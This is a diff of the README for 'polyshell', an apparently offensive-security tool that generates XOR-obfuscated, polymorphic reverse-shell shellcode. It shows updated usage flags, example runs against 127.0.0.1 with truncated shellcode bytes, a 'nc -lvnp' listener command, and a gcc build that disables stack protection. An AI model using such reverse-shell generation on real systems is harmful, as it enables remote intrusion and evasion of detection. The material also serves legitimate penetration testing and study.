@@ -20,7 +20,7 @@ This tool will randomly choose registry between `r8` to `r15` to handle the diff
          https://github.com/Vadimador/polyshell
 
     
-usage: polyshell [-h] [-i IP] [-p PORT] [-e {big,little}] [-n NBXOR] [-b]
+usage: main.py [-h] -i IP -p PORT [-e {big,little}] [-x XORNB] [-b] [-hs] [-v] [-o OUTFILE]
 
 optional arguments:
   -h, --help            show this help message and exit
@@ -28,9 +28,14 @@ optional arguments:
   -p PORT, --port PORT  Port to bind
   -e {big,little}, --endian {big,little}
                         Endianness of the target, default=little
-  -n NBXOR, --nbxor NBXOR
+  -x XORNB, --xornb XORNB
                         Number of xor to put, default=10
   -b, --build           Compile the C file
+  -hs, --hide-shellcode
+                        Hide the shellcode printing
+  -v, --verbose         Add verbosity printing
+  -o OUTFILE, --outfile OUTFILE
+                        Outfile shellcode's namee
 ```
 ## Requirements
 
@@ -60,11 +65,11 @@ ln -s $(readlink -f main.py) ~/.local/bin/polyshell
 └[~]> polyshell -i 127.0.0.1 -p 6666 -b
 
 
-     ▄▄▄·      ▄▄▌   ▄· ▄▌.▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
-    ▐█ ▄█▪     ██•  ▐█▪██▌▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  
-     ██▀· ▄█▀▄ ██▪  ▐█▌▐█▪▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  
+     ▄▄▄·      ▄▄▌   ▄· ▄▌.▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌
+    ▐█ ▄█▪     ██•  ▐█▪██▌▐█ ▀. ██▪▐█▀▄.▀·██•  ██•
+     ██▀· ▄█▀▄ ██▪  ▐█▌▐█▪▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪
     ▐█▪·•▐█▌.▐▌▐█▌▐▌ ▐█▀·.▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
-    .▀    ▀█▄▀▪.▀▀▀   ▀ •  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ 
+    .▀    ▀█▄▀▪.▀▀▀   ▀ •  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀
 
        Simple polymorphic reverse shell generator.
 
@@ -74,14 +79,9 @@ ln -s $(readlink -f main.py) ~/.local/bin/polyshell
 
  [!] Shellcode generated :
 
-\x4d\x31\xc9\x4d...\x0f\x05
+\x48\x31\xc0\x48\x31...\x0f\x05
 
 
- [!] Shellcode saved at shellcode.txt
-
- [+] Number of xor put : 10
- [+] IPv4 address to connect to : 127.0.0.1
- [+] Port to bind : 6666
  [+] Compiled shellcode : reverse_shell
  [+] Start a listener : nc -lvnp 6666
  ```
@@ -89,26 +89,27 @@ ln -s $(readlink -f main.py) ~/.local/bin/polyshell
  ### Create a reverse shell and modify the number of xor and hide shellcode printing
 ```bash
 ┌[Vadimador@d3v] 
-└[~]> polyshell -i 127.0.0.1 -p 1024 -x 54 -b -n
+└[~]> polyshell -i 127.0.0.1 -p 1024 -x 54 -b -v
 
 
-     ▄▄▄·      ▄▄▌   ▄· ▄▌.▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
-    ▐█ ▄█▪     ██•  ▐█▪██▌▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  
-     ██▀· ▄█▀▄ ██▪  ▐█▌▐█▪▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  
+
+     ▄▄▄·      ▄▄▌   ▄· ▄▌.▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌
+    ▐█ ▄█▪     ██•  ▐█▪██▌▐█ ▀. ██▪▐█▀▄.▀·██•  ██•
+     ██▀· ▄█▀▄ ██▪  ▐█▌▐█▪▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪
     ▐█▪·•▐█▌.▐▌▐█▌▐▌ ▐█▀·.▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
-    .▀    ▀█▄▀▪.▀▀▀   ▀ •  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ 
+    .▀    ▀█▄▀▪.▀▀▀   ▀ •  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀
 
        Simple polymorphic reverse shell generator.
 
                 Vadimador - Ninuuu - t4yki
          https://github.com/Vadimador/polyshell
 
- 
- [!] Shellcode saved at shellcode.txt
 
- [+] Number of xor put : 54
- [+] IPv4 address to connect to : 127.0.0.1
- [+] Port to bind : 1024
+ [!] Shellcode generated :
+
+\x4d\x31\xc9\x4d\x31\xf6...\xff\x0f\x05    
+
+
  [+] Compiled shellcode : reverse_shell
  [+] Start a listener : nc -lvnp 1024
 ```
@@ -117,14 +118,14 @@ ln -s $(readlink -f main.py) ~/.local/bin/polyshell
 
 ```bash
 ┌[Ninuuu@d3v] 
-└[~]> polyshell -i 127.0.0.1 -p 4444 -x 88
+└[~]> polyshell -i 127.0.0.1 -p 4444 -x 88 -v
 
 
-     ▄▄▄·      ▄▄▌   ▄· ▄▌.▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌  
-    ▐█ ▄█▪     ██•  ▐█▪██▌▐█ ▀. ██▪▐█▀▄.▀·██•  ██•  
-     ██▀· ▄█▀▄ ██▪  ▐█▌▐█▪▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪  
+     ▄▄▄·      ▄▄▌   ▄· ▄▌.▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌
+    ▐█ ▄█▪     ██•  ▐█▪██▌▐█ ▀. ██▪▐█▀▄.▀·██•  ██•
+     ██▀· ▄█▀▄ ██▪  ▐█▌▐█▪▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪
     ▐█▪·•▐█▌.▐▌▐█▌▐▌ ▐█▀·.▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌
-    .▀    ▀█▄▀▪.▀▀▀   ▀ •  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀ 
+    .▀    ▀█▄▀▪.▀▀▀   ▀ •  ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀
 
        Simple polymorphic reverse shell generator.
 
@@ -134,14 +135,9 @@ ln -s $(readlink -f main.py) ~/.local/bin/polyshell
 
  [!] Shellcode generated :
 
-\x4d\x31\xed\x4d\x31\xed\x4d...\x0f\x05
+\x4d\x31\xc9\x4d\x31...\x0f\x05
 
 
- [!] Shellcode saved at shellcode.txt
-
- [+] Number of xor put : 88
- [+] IPv4 address to connect to : 127.0.0.1
- [+] Port to bind : 4444
- [+] Shellcode at : reverse_shell.c
+ [+] C file to test the shellcode : reverse_shell.c
  [+] Build : gcc reverse_shell.c -o shell -fno-stack-protector -z execstack -no-pie
 ```
